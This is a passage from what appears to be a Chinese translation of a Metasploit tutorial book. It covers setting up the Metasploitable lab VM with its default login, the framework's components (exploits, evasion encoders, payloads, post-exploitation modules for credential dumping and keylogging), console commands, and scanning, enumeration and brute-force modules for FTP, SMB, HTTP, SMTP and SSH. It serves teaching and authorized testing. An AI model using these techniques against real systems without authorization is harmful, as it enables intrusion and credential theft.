![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/e156c530-63b8-498c-88b2-fa0db0ae2300.png)

让我们尝试通过命令行界面访问它：

1.  打开终端窗口，输入命令`msfconsole`并按*Enter*。您应该在屏幕上看到以下内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/59907327-dd88-4536-b94f-98ccf54f8078.png)

# 在虚拟环境中设置可利用的目标

Metasploit 是一个强大的渗透测试框架，如果不以受控的方式使用，可能会对目标系统造成潜在的损害。为了学习和练习 Metasploit，我们当然不能在任何未经授权的生产系统上使用它。但是，我们可以在自己的虚拟环境中练习我们新学到的 Metasploit 技能，这个环境是故意制造成易受攻击的。这可以通过一个名为*Metasploitable*的基于 Linux 的系统实现，该系统具有从操作系统级别到应用程序级别的许多不同的琐碎漏洞。Metasploitable 是一个可直接使用的虚拟机，可以从以下位置下载：[`sourceforge.net/projects/metasploitable/files/Metasploitable2/`](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/)

一旦下载完成，为了运行虚拟机，您需要在系统上安装 VMPlayer 或 VMware Workstation。以下是安装步骤以及屏幕截图：

如果尚未安装，可以从[`www.vmware.com/go/downloadplayer`](https://www.vmware.com/go/downloadplayer)获取 VMPlayer

1.  为了运行 Metasploitable 虚拟机，首先让我们将其从 zip 文件中提取到我们选择的任何位置：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/7bedeea3-8048-404b-b9e9-af5d1e3383c9.png)

1.  双击 Metasploitable VMware 虚拟机配置文件以打开虚拟机。这将需要事先安装 VMPlayer 或 VMware Workstation：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/fd940f52-9911-4807-9682-2e542a37e9e3.jpg)

1.  单击绿色的“播放”图标启动虚拟机：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/71fba7ea-2835-4cef-9a23-5e1112210f35.jpg)

1.  虚拟机启动后，您可以使用以下凭据登录：

```
 User name - msfadmin
 Password - msfadmin
```

我们可以稍后使用这个虚拟机来练习我们在本书中学到的技能。

# 摘要

在本章中，我们学习了如何通过在各种平台上安装 Metasploit 框架来快速入门。安装完成后，我们将继续下一章，了解 Metasploit 的结构和组件级别的详细信息。

# 练习

您可以尝试以下练习：

+   下载 Kali Linux 虚拟机，并在 VMPlayer 或 VMware Workstation 中运行

+   尝试在 Ubuntu 上安装 Metasploit 框架


# 第三章：Metasploit 组件和环境配置

对于我们用来执行特定任务的任何工具，了解该工具的内部始终是有帮助的。对工具的详细了解使我们能够恰当地使用它，使其充分发挥其能力。现在您已经学会了 Metasploit Framework 及其安装的一些绝对基础知识，在本章中，您将学习 Metasploit Framework 的结构以及 Metasploit 生态系统的各种组件。本章将涵盖以下主题：

+   Metasploit 的解剖和结构

+   Metasploit 组件--辅助模块、利用、编码器、有效载荷和后期

+   开始使用 msfconsole 和常用命令

+   配置本地和全局变量

+   更新框架

# Metasploit 的解剖和结构

学习 Metasploit 结构的最佳方法是浏览其目录。在使用 Kali Linux 时，Metasploit Framework 通常位于路径`/usr/share/metasploit-framework`，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/27cf4c84-1f03-4d55-8e27-dd8e43a708e5.jpg)

在较高层次上，Metasploit Framework 的结构如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/15ec4cab-a7ef-44c7-903f-ffc91f0201a9.jpg)

Metasploit Framework 具有非常清晰和明确定义的结构，框架内的工具/实用程序根据它们在渗透测试生命周期的各个阶段中的相关性进行组织。随着我们在本书中的进展，我们将使用来自每个类别的工具/实用程序。

在下一节中，我们将简要概述所有 Metasploit 组件。

# Metasploit 组件

Metasploit Framework 具有基于其在渗透测试阶段中的角色的各种组件类别。以下各节将详细了解每个组件类别的责任。

# 辅助模块

到目前为止，您已经了解到 Metasploit 是一个完整的渗透测试框架，而不仅仅是一个工具。当我们称其为框架时，这意味着它包含许多有用的工具和实用程序。Metasploit Framework 中的辅助模块只是用于执行特定任务（在我们的渗透测试生命周期范围内）的小代码片段。例如，您可能需要执行一个简单的任务，验证特定服务器的证书是否已过期，或者您可能想要扫描您的子网并检查是否有任何 FTP 服务器允许匿名访问。使用 Metasploit Framework 中存在的辅助模块可以非常轻松地完成这些任务。

在 Metasploit Framework 中有 1000 多个辅助模块分布在 18 个类别中。

以下表格显示了 Metasploit Framework 中存在的各种辅助模块的各个类别：

| `gather` | `pdf` | `vsploit` |
| --- | --- | --- |
| `bnat` | `sqli` | `client` |
| `crawler` | `fuzzers` | `server` |
| `spoof` | `parser` | `voip` |
| `sniffer` | `analyze` | `dos` |
| `docx` | `admin` | `scanner` |

不要被 Metasploit Framework 中存在的辅助模块数量所压倒。您可能不需要单独了解每个模块。您只需要在所需的上下文中搜索正确的模块并相应地使用它。现在我们将看到如何使用辅助模块。

在本书的过程中，我们将根据需要使用许多不同的辅助模块；但是，让我们从一个简单的例子开始：

1.  打开终端窗口，并使用命令`msfconsole`启动 Metasploit。

1.  选择`auxiliary`模块`portscan/tcp`来对目标系统执行端口扫描。

1.  使用`show`命令，列出运行此辅助模块所需配置的所有参数。

1.  使用`set RHOSTS`命令，设置我们目标系统的 IP 地址。

1.  使用`set PORTS`命令，选择要在目标系统上扫描的端口范围。

1.  使用`run`命令，执行先前配置的参数的辅助模块。

您可以在以下截图中看到所有先前提到的命令的使用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/5444ac03-268e-4203-afe2-a517f6ce0114.jpg)

# 利用

利用是 Metasploit 框架中最重要的部分。利用是实际的代码片段，将为您提供对目标系统所需的访问权限。根据支持利用的平台，有 2500 多个利用分布在 20 多个类别中。现在，您可能会想到在这么多可用的利用中，需要使用哪一个。只有在对目标进行广泛的枚举和漏洞评估之后，才能决定使用特定的利用对目标进行攻击（参见第一章中的渗透测试生命周期部分，*Metasploit 和支持工具简介*）。对目标进行适当的枚举和漏洞评估将为我们提供以下信息，基于这些信息，我们可以选择正确的利用：

+   目标系统的操作系统（包括确切的版本和架构）

+   目标系统上的开放端口（TCP 和 UDP）

+   目标系统上运行的服务及其版本

+   特定服务存在漏洞的概率

以下表格显示了 Metasploit 框架中提供的各种利用类别：

| **Linux** | **Windows** | **Unix** | **OS X** | **Apple iOS** |
| --- | --- | --- | --- | --- |
| `irix` | `mainframe` | `freebsd` | `solaris` | `bsdi` |
| `firefox` | `netware` | `aix` | `android` | `dialup` |
| `hpux` | `jre7u17` | `wifi` | `php` | `mssql` |

在接下来的章节中，我们将看到如何针对易受攻击的目标使用利用。

# 编码器

在任何给定的现实世界渗透测试场景中，我们尝试攻击目标系统很可能会被目标系统上存在的某种安全软件检测到/注意到。这可能会危及我们所有的努力来获取对远程系统的访问权限。这正是编码器发挥作用的时候。编码器的工作是以这样的方式混淆我们的利用和有效载荷，以至于它在目标系统上的任何安全系统都不会被注意到。

以下表格显示了 Metasploit 框架中提供的各种编码器类别：

| `generic` | `mipsbe` | `ppc` |
| --- | --- | --- |
| `x64` | `php` | `mipsle` |
| `cmd` | `sparc` | `x86` |

我们将在接下来的章节中更详细地了解编码器。

# 有效载荷

要了解有效载荷的作用，让我们考虑一个现实世界的例子。某个国家的军事单位开发了一种新型导弹，可以以非常高的速度飞行 500 公里。现在，导弹本身是没有用的，除非它装满了正确类型的弹药。现在，军事单位决定在导弹内部装载高爆材料，这样当导弹击中目标时，导弹内部的高爆材料就会爆炸，对敌人造成所需的伤害。因此，在这种情况下，导弹内的高爆材料就是有效载荷。根据导弹发射后要造成的破坏程度，可以更改有效载荷。

同样，在 Metasploit 框架中的有效载荷让我们决定在成功利用后对目标系统执行什么操作。以下是 Metasploit 框架中提供的各种有效载荷类别：

+   **Singles**：有时也称为内联或非分段有效载荷。此类别中的有效载荷是利用的完全独立单元，并且需要 shellcode，这意味着它们具有利用目标漏洞所需的一切。这种有效载荷的缺点是它们的大小。由于它们包含完整的利用和 shellcode，它们有时可能相当庞大，使它们在某些有大小限制的场景中变得无用。

+   **分段**：在某些情况下，有效载荷的大小非常重要。即使是多一个字节的有效载荷在目标系统上也可能无法正常运行。在这种情况下，分段有效载荷非常有用。分段有效载荷简单地在攻击系统和目标系统之间建立连接。它没有在目标系统上利用漏洞所需的 shellcode。由于体积非常小，它在许多情况下都能很好地适用。

+   **阶段**：一旦分段类型的有效载荷建立了攻击系统和目标系统之间的连接，“阶段”有效载荷就会被下载到目标系统上。它们包含在目标系统上利用漏洞所需的 shellcode。

以下截图显示了一个示例有效载荷，可用于从受损的 Windows 系统获取反向 TCP shell：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/cd86e78f-33cc-4b84-9df3-6edf7952937d.jpg)

在接下来的章节中，您将学习如何使用各种有效载荷以及利用。

# 后期

**post**模块包含各种脚本和实用程序，可以在成功利用后帮助我们进一步渗透目标系统。一旦成功利用漏洞并进入目标系统，后期利用模块可能以以下方式帮助我们：

+   提升用户权限

+   转储操作系统凭据

+   窃取 cookie 和保存的密码

+   从目标系统获取按键日志

+   执行 PowerShell 脚本

+   使我们的访问持久化

以下表格显示了 Metasploit Framework 中可用的各种“post”模块的不同类别：

| **Linux** | **Windows** | **OS X** | **Cisco** |
| --- | --- | --- | --- |
| Solaris | Firefox | Aix | Android |
| 多功能 | Zip | Powershell |  |

Metasploit Framework 有 250 多个后期利用实用程序和脚本。在接下来的章节中，我们将讨论更多关于后期利用技术的内容时，会使用其中一些。

# 玩转 msfconsole

现在我们对 Metasploit Framework 的结构有了基本的了解，让我们开始实际学习`msfconsole`的基础知识。

`msfconsole`只是 Metasploit Framework 的简单命令行界面。虽然`msfconsole`可能一开始看起来有点复杂，但它是与 Metasploit Framework 交互的最简单和最灵活的方式。在本书的学习过程中，我们将一直使用`msfconsole`与 Metasploit 框架进行交互。

一些 Metasploit 版本确实提供了 GUI 和基于 Web 的界面。然而，从学习的角度来看，始终建议掌握 Metasploit Framework 的命令行控制台`msfconsole`。

让我们看一些`msfconsole`命令：

+   `banner`命令：`banner`命令是一个非常简单的命令，用于显示 Metasploit Framework 的横幅信息。此信息通常包括其版本详细信息以及当前安装版本中可用的漏洞、辅助工具、有效载荷、编码器和 nop 生成器的数量。

它的语法是`msf> banner`。以下截图显示了`banner`命令的使用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/58b4e734-0bff-4b84-be19-b7bc9a4e66d7.jpg)

+   `version`命令：`version`命令用于检查当前 Metasploit Framework 安装的版本。您可以访问以下网站以检查 Metasploit 官方发布的最新版本：

[`github.com/rapid7/metasploit-framework/wiki/Downloads-by-Version`](https://github.com/rapid7/metasploit-framework/wiki/Downloads-by-Version)

它的语法是`msf> version`。以下截图显示了`version`命令的使用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/f158beba-59f0-48ff-9cdc-d725fa9c3c62.jpg)

+   `connect`命令：Metasploit Framework 中的`connect`命令提供了类似于 putty 客户端或 netcat 的功能。您可以使用此功能进行快速端口扫描或端口横幅抓取。

它的语法是`msf> connect <ip:port>`。以下截图显示了`connect`命令的使用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/462a7394-2152-419f-9905-19a6355f0e3d.jpg)

+   `help`命令：顾名思义，`help`命令提供有关 Metasploit Framework 中任何命令的使用的附加信息。

其语法为`msf> help`。以下截图显示了`help`命令的使用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/7264dc7f-0742-4616-9a98-aa8d4ff5bbf5.jpg)

+   `route`命令：`route`命令用于添加、查看、修改或删除网络路由。这用于高级场景中的枢纽，我们将在本书的后面部分介绍。 

其语法为`msf> route`。以下截图显示了`route`命令的使用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/fa5f8fb1-6c01-4200-b0ce-ec3d79a91402.jpg)

+   `save`命令：有时，在对复杂目标环境进行渗透测试时，Metasploit Framework 会进行许多配置更改。现在，如果需要稍后再次恢复渗透测试，从头开始重新配置 Metasploit Framework 将非常痛苦。`save`命令将所有配置保存到文件中，并在下次启动时加载，节省了所有重新配置的工作。

其语法为`msf>save`。以下截图显示了`save`命令的使用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/7a17a776-4823-42c4-9305-f000a33faf19.jpg)

+   `sessions`命令：一旦我们成功利用目标，通常会在目标系统上获得一个 shell 会话。如果我们同时在多个目标上工作，可能会同时打开多个会话。Metasploit Framework 允许我们根据需要在多个会话之间切换。`sessions`命令列出了与各个目标系统建立的所有当前活动会话。

其语法为`msf>sessions`。以下截图显示了`sessions`命令的使用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/1f2d3a78-714a-4fc4-9a5f-35dbd857601e.jpg)

+   `spool`命令：就像任何应用程序都有帮助调试错误的调试日志一样，`spool`命令将所有输出打印到用户定义的文件以及控制台。稍后可以根据需要分析输出文件。

其语法为`msf>spool`。以下截图显示了`spool`命令的使用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/65a945d8-6273-4aff-a321-d14209ccd793.jpg)

+   `show`命令：`show`命令用于显示 Metasploit Framework 中可用的模块，或在使用特定模块时显示附加信息。

其语法为`msf> show`。以下截图显示了`show`命令的使用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/1a7b8409-4229-42c5-885a-3432802c1a70.jpg)

+   `info`命令：`info`命令用于显示 Metasploit Framework 中特定模块的详细信息。例如，您可能希望查看有关 meterpreter 有效载荷的信息，例如支持的架构和执行所需的选项：

其语法为`msf> info`。以下截图显示了`info`命令的使用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/0b92866c-e5a6-4203-a7f5-e95acd2c95c6.jpg)

+   `irb`命令：`irb`命令从 Metasploit Framework 内部调用交互式 Ruby 平台。交互式 Ruby 平台可用于在后期利用阶段创建和调用自定义脚本。

其语法为`msf>irb`。以下截图显示了`irb`命令的使用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/be2a6bc4-77c8-4e3a-babb-a9b753d35136.jpg)

+   `makerc`命令：当我们使用 Metasploit Framework 对目标进行渗透测试时，会发出许多命令。在任务结束或特定会话结束时，我们可能希望回顾通过 Metasploit 执行的所有活动。`makerc`命令简单地将特定会话的所有命令历史写入用户定义的输出文件。

其语法为`msf>makerc`。以下截图显示了`makerc`命令的使用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/bb26c1eb-8e9f-4811-b165-e5c5f77b3c5c.jpg)

# Metasploit 中的变量

对于我们在 Metasploit 框架中使用的大多数利用，我们需要为一些变量设置值。以下是 Metasploit 框架中一些常见和最重要的变量：

| **变量名称** | **变量描述** |
| --- | --- |
| `LHOST` | 本地主机：此变量包含攻击者系统的 IP 地址，即我们发起利用的系统的 IP 地址。 |
| `LPORT` | 本地端口：此变量包含攻击者系统的（本地）端口号。当我们期望利用给我们提供反向 shell 时，通常需要这个。 |
| `RHOST` | 远程主机：此变量包含目标系统的 IP 地址。 |
| `RPORT` | 远程端口：此变量包含我们将攻击/利用的目标系统上的端口号。例如，要利用远程目标系统上的 FTP 漏洞，RPORT 将设置为 21。 |

+   `get`命令：`get`命令用于检索 Metasploit 框架中特定本地变量中包含的值。例如，您可能想查看为特定利用设置的目标系统的 IP 地址。

其语法是`msf>get`。以下截图显示了`msf> get`命令的使用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/e67fe1c2-7067-48b1-af06-6dbaf39b2a2e.jpg)

+   `getg`命令：`getg`命令与`get`命令非常相似，只是返回全局变量中包含的值。

其语法是`msf> getg`。以下截图显示了`msf> getg`命令的使用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/21ba77ae-8ba7-417e-9ff6-dcbb9a602d2d.jpg)

+   `set`和`setg`命令：`set`命令为 Metasploit 框架中的一个（本地）变量（如`RHOST`、`RPORT`、`LHOST`和`LPPORT`）分配一个新值。但是，`set`命令为一个有限的会话/实例分配一个变量的值。`setg`命令为（全局）变量永久分配一个新值，以便在需要时可以重复使用。

其语法是：

```
msf> set <VARIABLE> <VALUE>
msf> setg <VARIABLE> <VALUE>
```

我们可以在以下截图中看到`set`和`setg`命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/2a690008-4b20-45aa-9323-462d09b1e925.jpg)

+   `unset`和`unsetg`命令：`unset`命令简单地清除通过`set`命令之前存储在（本地）变量中的值。`unsetg`命令通过`setg`命令清除之前存储在（全局）变量中的值：

语法是：

```
msf> unset<VARIABLE>
msf> unsetg <VARIABLE>
```

我们可以在以下截图中看到`unset`和`unsetg`命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/6d69985e-c49e-474d-9ca7-aa714603e711.jpg)

# 更新 Metasploit 框架

Metasploit 框架由 Rapid 7 提供商业支持，并拥有一个非常活跃的开发社区。几乎每天都会在各种系统中发现新的漏洞。对于任何这种新发现的漏洞，很有可能在 Metasploit 框架中获得一个现成的利用。但是，为了跟上最新的漏洞和利用，保持 Metasploit 框架的更新是很重要的。您可能不需要每天更新框架（除非您非常积极地参与渗透测试）；但是，您可以定期进行更新。

Metasploit 框架提供了一个简单的实用程序称为`msfupdate`，它连接到相应的在线存储库并获取更新：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/d3a1b5d7-47e2-4514-99aa-aba935b30953.jpg)

# 摘要

在本章中，我们已经看到了 Metasploit 框架的结构和一些常见的控制台命令。在下一章中，我们将实际开始使用 Metasploit 框架来执行对目标系统的信息收集和枚举。对于在 Metasploit 框架中使用大多数模块，记住以下顺序：

1.  使用`use`命令选择所需的 Metasploit 模块。

1.  使用`show options`命令列出执行所选模块所需的所有变量。

1.  使用`set`命令设置所需变量的值。

1.  使用`run`命令执行先前配置的变量的模块。

# 练习

您可以尝试以下练习：

+   浏览 Metasploit Framework 的目录结构

+   尝试一些本章讨论的常见控制台命令

+   更新 Metasploit Framework 到最新可用版本


# 第四章：使用 Metasploit 进行信息收集

信息收集和枚举是渗透测试生命周期的初始阶段。这些阶段经常被忽视，人们直接使用自动化工具试图快速妥协目标。然而，这样的尝试成功的可能性较小。

“给我六个小时砍倒一棵树，我将花前四个小时磨削斧头。”

- 亚伯拉罕·林肯

这是亚伯拉罕·林肯的一句非常著名的名言，它也适用于渗透测试！您对目标进行信息收集和枚举的努力越多，成功妥协的可能性就越大。通过进行全面的信息收集和枚举，您将获得关于目标的大量信息，然后您可以精确地决定攻击向量，以便妥协目标。

Metasploit 框架提供了各种辅助模块，用于进行被动和主动信息收集以及详细的枚举。本章介绍了 Metasploit 框架中提供的一些重要信息收集和枚举模块：

要涵盖的主题如下：

+   各种协议的信息收集和枚举

+   使用 Metasploit 进行密码嗅探

+   使用 Shodan 进行高级搜索

# 信息收集和枚举

在本节中，我们将探讨 Metasploit 框架中各种辅助模块，这些模块可以有效地用于信息收集和枚举各种协议，如 TCP、UDP、FTP、SMB、SMTP、HTTP、SSH、DNS 和 RDP。对于这些协议，您将学习多个辅助模块以及必要的变量配置。

# 传输控制协议

**传输控制协议**（**TCP**）是一种面向连接的协议，可以确保可靠的数据包传输。许多服务，如 Telnet、SSH、FTP 和 SMTP，都使用 TCP 协议。该模块对目标系统执行简单的端口扫描，并告诉我们哪些 TCP 端口是打开的。

它的辅助模块名称是`auxiliary/scanner/portscan/tcp`，您将需要配置以下参数：

+   **RHOSTS**：要扫描的目标的 IP 地址或 IP 范围

+   **PORTS**：要扫描的端口范围

我们可以在以下截图中看到这个辅助模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/82886ff3-e9fb-483e-bfa4-061f96663291.jpg)

# 用户数据报协议

**用户数据报协议**（**UDP**）与 TCP 相比更轻量，但不像 TCP 那样可靠。UDP 被 SNMP 和 DNS 等服务使用。该模块对目标系统执行简单的端口扫描，并告诉我们哪些 UDP 端口是打开的。

它的辅助模块名称是`auxiliary/scanner/discovery/udp_sweep`，您将需要配置以下参数：

+   **RHOSTS**：要扫描的目标的 IP 地址或 IP 范围

我们可以在以下截图中看到这个辅助模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c2bccbaa-6851-417e-aa48-393dc9d23d2d.jpg)

# 文件传输协议

**文件传输协议**（**FTP**）最常用于客户端和服务器之间的文件共享。FTP 使用 TCP 端口 21 进行通信。

让我们来看看以下 FTP 辅助模块：

+   `ftp_login`：该模块帮助我们对目标 FTP 服务器执行暴力攻击。

它的辅助模块名称是`auxiliary/scanner/ftp/ftp_login`，您将需要配置以下参数：

+   +   **RHOSTS**：要扫描的目标的 IP 地址或 IP 范围

+   **USERPASS_FILE**：包含用户名/密码列表的文件路径

您可以创建自己的自定义列表，用于暴力攻击，或者在 Kali Linux 中有许多立即可用的单词列表，位于`|usr|share|wordlists`。

我们可以在以下截图中看到这个辅助模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/afcbe40b-e557-4fdc-a864-44da7fef2066.jpg)

+   `ftp_version`：该模块使用横幅抓取技术来检测目标 FTP 服务器的版本。

它的辅助模块名称是`auxiliary/scanner/ftp/ftp_version`，您将需要配置以下参数：

+   **RHOSTS**：目标要扫描的 IP 地址或 IP 范围

一旦您知道目标服务的版本，您可以开始搜索特定版本的漏洞和相应的利用。

我们可以在以下截图中看到这个辅助模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/d6b73b89-ebcd-4eb0-88eb-37d4e3057a14.jpg)

+   **anonymous**：一些 FTP 服务器配置错误，允许匿名用户访问。这个辅助模块探测目标 FTP 服务器，以检查它是否允许匿名访问。

它的辅助模块名称是`auxiliary/scanner/ftp/anonymous`，您将需要配置以下参数：

+   +   **RHOSTS**：目标要扫描的 IP 地址或 IP 范围

我们可以在以下截图中看到这个辅助模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/eba2af50-d4eb-4989-82db-69f11c9fb920.jpg)

# 服务器消息块

**服务器消息块**（**SMB**）是一个主要用于共享文件、打印机等的应用层协议。SMB 使用 TCP 端口 445 进行通信。

让我们来看一些以下 SMB 辅助功能：

+   ：这个辅助模块探测目标以检查它运行的 SMB 版本。

它的辅助模块名称是`auxiliary/scanner/smb/smb_version`，您将需要配置以下参数：

+   +   **RHOSTS**：目标要扫描的 IP 地址或 IP 范围

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/4ad52686-19db-479c-a12d-351e77050acf.jpg)

+   `smb_enumusers`：这个辅助模块通过 SMB RPC 服务连接到目标系统，并枚举系统上的用户。

它的辅助模块名称是`auxiliary/scanner/smb/smb_enumusers`，您将需要配置以下参数：

+   +   **RHOSTS**：目标要扫描的 IP 地址或 IP 范围

一旦您获得了目标系统上的用户列表，您可以开始准备对这些用户进行密码破解攻击。

我们可以在以下截图中看到这个辅助模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/25d5286e-0605-487e-bdf3-db8cab206600.jpg)

+   `smb_enumshares`：这个辅助模块枚举了目标系统上可用的 SMB 共享。

它的辅助模块名称是`auxiliary/scanner/smb/smb_enumshares`，您将需要配置以下参数：

+   +   **RHOSTS**：目标要扫描的 IP 地址或 IP 范围

我们可以在以下截图中看到这个辅助模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/5116db90-bfb4-4ef1-aad6-7fecf5fa77d5.jpg)

# 超文本传输协议

HTTP 是一个用于在万维网上交换信息的无状态应用层协议。HTTP 使用 TCP 端口`80`进行通信。

让我们来看一些以下 HTTP 辅助功能：

+   `http_version`：这个辅助模块探测并检索目标系统上运行的 Web 服务器版本。它还可能提供有关目标正在运行的操作系统和 Web 框架的信息。

它的辅助模块名称是`auxiliary/scanner/http/http_version`，您将需要配置以下参数：

+   +   **RHOSTS**：目标要扫描的 IP 地址或 IP 范围

我们可以在以下截图中看到这个辅助模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/2b578ab7-246d-4bbc-9407-b3d0531270cc.jpg)

+   `backup_file`：有时，开发人员和应用程序管理员会忘记从 Web 服务器中删除备份文件。这个辅助模块探测目标 Web 服务器是否存在这样的文件，因为管理员可能会忘记删除它们。这些文件可能会提供有关目标系统的额外详细信息，并有助于进一步的妥协。

它的辅助模块名称是`auxiliary/scanner/http/backup_file`，您将需要配置以下参数：

+   +   **RHOSTS**：目标要扫描的 IP 地址或 IP 范围

我们可以在以下截图中看到这个辅助模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/17a27377-01c4-41d9-95c4-e589fbc9e946.jpg)

+   `dir_listing`：经常出现的情况是 Web 服务器被错误配置为显示根目录中包含的文件列表。该目录可能包含通常不通过网站链接公开的文件，并泄露敏感信息。此辅助模块检查目标 Web 服务器是否容易受到目录列表的影响。

其辅助模块名称为`auxiliary/scanner/http/dir_listing`，您将需要配置以下参数：

+   +   目标的 IP 地址或 IP 范围

+   **PATH**：检查目录列表的可能路径

我们可以在以下截图中看到这个辅助模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/04aa3754-e638-4fcc-a39b-0bcf018a7389.jpg)

+   `ssl`：虽然 SSL 证书通常用于加密传输中的数据，但经常发现它们要么配置错误，要么使用弱加密算法。此辅助模块检查目标系统上安装的 SSL 证书可能存在的弱点。

其辅助模块名称为`auxiliary/scanner/http/ssl`，您将需要配置以下参数：

+   +   目标的 IP 地址或 IP 范围

我们可以在以下截图中看到这个辅助模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/7768c2e9-8c1f-44c1-9fd8-b91738be6882.jpg)

+   `http_header`：大多数 Web 服务器没有经过安全加固。这导致 HTTP 头泄露服务器和操作系统版本的详细信息。此辅助模块检查目标 Web 服务器是否通过 HTTP 头提供任何版本信息。

其辅助模块名称为`auxiliary/scanner/http/http_header`，您将需要配置以下参数：

+   +   目标的 IP 地址或 IP 范围

我们可以在以下截图中看到这个辅助模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/45a34536-f20c-4eaf-8290-c59ca7b4990e.jpg)

+   `robots_txt`：大多数搜索引擎通过蜘蛛和爬行网站并索引页面的机器人工作。然而，特定网站的管理员可能不希望他的网站的某个部分被任何搜索机器人爬行。在这种情况下，他使用`robots.txt`文件告诉搜索机器人在爬行时排除站点的某些部分。此辅助模块探测目标以检查`robots.txt`文件的存在。该文件通常会显示目标系统上存在的敏感文件和文件夹列表。

其辅助模块名称为`auxiliary/scanner/http/robots_txt`，您将需要配置以下参数：

+   +   目标的 IP 地址或 IP 范围

我们可以在以下截图中看到这个辅助模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/367f695c-4e14-4a20-b56d-c7919102ee41.jpg)

# 简单邮件传输协议

SMTP 用于发送和接收电子邮件。SMTP 使用 TCP 端口 25 进行通信。此辅助模块探测目标系统上的 SMTP 服务器版本，并列出配置为使用 SMTP 服务的用户。

其辅助模块名称为`auxiliary/scanner/smtp/smtp_enum`，您将需要配置以下参数：

+   目标的 IP 地址或 IP 范围

+   **USER_FILE**：包含用户名列表的文件路径

我们可以在以下截图中看到这个辅助模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/85dfc31b-f5f9-4778-9bfa-119d4fe4fc1c.jpg)

# 安全外壳

SSH 通常用于加密通道上的远程管理。SSH 使用 TCP 端口 22 进行通信。

让我们看一些 SSH 辅助模块：

+   `ssh_enumusers`：此辅助模块探测目标系统上的 SSH 服务器，以获取远程系统上配置为使用 SSH 服务的用户列表。

其辅助模块名称为`auxiliary/scanner/ssh/ssh_enumusers`，您将需要配置以下参数：

+   +   目标的 IP 地址或 IP 范围

+   **USER_FILE**：包含用户名列表的文件路径

我们可以在以下截图中看到这个辅助模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/af5bb689-5b20-478e-8563-5a485fd8f733.jpg)

+   `ssh_login`：这个辅助模块对目标 SSH 服务器执行暴力破解攻击。

它的辅助模块名称是`auxiliary/scanner/ssh/ssh_login`，您将需要配置以下参数：

+   +   **RHOSTS**：目标的 IP 地址或 IP 范围

+   **USERPASS_FILE**：包含用户名和密码列表的文件路径

我们可以在以下截图中看到这个辅助模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/4b5237e1-2432-4c51-8697-0a2709bc3f84.jpg)

+   `ssh_version`：这个辅助模块探测目标 SSH 服务器，以便检测其版本以及底层操作系统的版本。

它的辅助模块名称是`auxiliary/scanner/ssh/ssh_version`，您将需要配置以下参数：

